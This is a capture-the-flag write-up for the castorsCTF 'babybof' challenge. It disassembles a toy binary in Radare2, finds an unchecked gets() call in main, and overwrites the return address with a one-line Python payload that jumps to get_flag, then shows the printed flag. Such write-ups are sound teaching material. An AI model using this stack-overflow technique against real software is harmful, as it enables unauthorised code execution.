# babybof

## Solution

Like with abcbof, we can use Radare2 to list all functions.

```
[greenavocado@greenavocado-pc babybof-pt1]$ r2 babybof
 -- Don't waste your time
[0x00400600]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400600]> afl
0x00400600    1 42           entry0
0x00400640    4 42   -> 37   sym.deregister_tm_clones
0x00400670    4 58   -> 55   sym.register_tm_clones
0x004006b0    3 34   -> 29   sym.__do_global_dtors_aux
0x004006e0    1 7            entry.init0
0x00400800    1 2            sym.__libc_csu_fini
0x004006e7    5 102          sym.get_flag
0x004005e0    1 6            sym.imp.fopen
0x004005f0    1 6            sym.imp.exit
0x00400580    1 6            sym.imp.putchar
0x004005c0    1 6            sym.imp.fgetc
0x004005a0    1 6            sym.imp.fclose
0x00400804    1 9            sym._fini
0x00400790    4 101          sym.__libc_csu_init
0x00400630    1 2            sym._dl_relocate_static_pie
0x0040074d    1 63           main
0x00400590    1 6            sym.imp.puts
0x004005b0    1 6            sym.imp.printf
0x004005d0    1 6            sym.imp.gets
0x00400550    3 23           sym._init
```

If we check the ```sym.get_flag``` function again, we would find that it's the same as the previous one, but with different addresses.

```asm
[0x00400600]> pdf @ sym.get_flag
┌ 102: sym.get_flag ();
│           ; var uint32_t c @ rbp-0x9
│           ; var file*stream @ rbp-0x8
│           0x004006e7      55             push rbp
│           0x004006e8      4889e5         mov rbp, rsp
│           0x004006eb      4883ec10       sub rsp, 0x10
│           0x004006ef      488d35220100.  lea rsi, [0x00400818]       ; "r" ; const char *mode
│           0x004006f6      488d3d1d0100.  lea rdi, str.flag.txt       ; 0x40081a ; "flag.txt" ; const char *filename
│           0x004006fd      e8defeffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x00400702      488945f8       mov qword [stream], rax
│           0x00400706      48837df800     cmp qword [stream], 0
│       ┌─< 0x0040070b      7515           jne 0x400722
│       │   0x0040070d      bf01000000     mov edi, 1                  ; int status
│       │   0x00400712      e8d9feffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from sym.get_flag @ 0x400735
│      ┌──> 0x00400717      0fbe45f7       movsx eax, byte [c]
│      ╎│   0x0040071b      89c7           mov edi, eax                ; int c
│      ╎│   0x0040071d      e85efeffff     call sym.imp.putchar        ; int putchar(int c)
│      ╎│   ; CODE XREF from sym.get_flag @ 0x40070b
│      ╎└─> 0x00400722      488b45f8       mov rax, qword [stream]
│      ╎    0x00400726      4889c7         mov rdi, rax                ; FILE *stream
│      ╎    0x00400729      e892feffff     call sym.imp.fgetc          ; int fgetc(FILE *stream)
│      ╎    0x0040072e      8845f7         mov byte [c], al
│      ╎    0x00400731      807df7ff       cmp byte [c], 0xff
│      └──< 0x00400735      75e0           jne 0x400717
│           0x00400737      488b45f8       mov rax, qword [stream]
│           0x0040073b      4889c7         mov rdi, rax                ; FILE *stream
│           0x0040073e      e85dfeffff     call sym.imp.fclose         ; int fclose(FILE *stream)
│           0x00400743      bf00000000     mov edi, 0                  ; int status
└           0x00400748      e8a3feffff     call sym.imp.exit           ; void exit(int status)
```

Again, we note the address of this function, which is ```0x004006e7```

Then, we disassemble the ```main``` function.

```asm
[0x00400600]> pdf @ main
            ; DATA XREF from entry0 @ 0x40061d
┌ 63: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x100
│           0x0040074d      55             push rbp
│           0x0040074e      4889e5         mov rbp, rsp
│           0x00400751      4881ec000100.  sub rsp, 0x100
│           0x00400758      488d3dc90000.  lea rdi, str.Welcome_to_the_cybercastors_Babybof ; 0x400828 ; "Welcome to the cybercastors Babybof" ; const char *s
│           0x0040075f      e82cfeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400764      488d3de10000.  lea rdi, str.Say_your_name: ; 0x40084c ; "Say your name: " ; const char *format
│           0x0040076b      b800000000     mov eax, 0
│           0x00400770      e83bfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00400775      488d8500ffff.  lea rax, [s]
│           0x0040077c      4889c7         mov rdi, rax                ; char *s
│           0x0040077f      b800000000     mov eax, 0
│           0x00400784      e847feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x00400789      90             nop
│           0x0040078a      c9             leave
└           0x0040078b      c3             ret
```

This time, ```gets()``` is called almost immediately before the function returns.
There are no variables to overwrite, but we can still overwrite the return address.

```gets()``` uses the address at ```rbp-0x100```, so we need 0x100+8 bytes to overwrite ```rbp```, and another 8 bytes for the address.

This can be done using python:

```
python -c "import sys; sys.stdout.buffer.write(b'\x41' * (0x100 + 8) + b'\xe7\x06\x40\x00\x00\x00\x00\x00')" | ./babybof
```

Here's the output:

```
[greenavocado@greenavocado-pc babybof-pt1]$ python -c "import sys; sys.stdout.buffer.write(b'\x41' * (0x100 + 8) + b'\xe7\x06\x40\x00\x00\x00\x00\x00')" | ./babybof
Welcome to the cybercastors Babybof
Say your name: castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}
```

## Flag

```castorsCTF{th4t's_c00l_but_c4n_y0u_g3t_4_sh3ll_n0w?}```

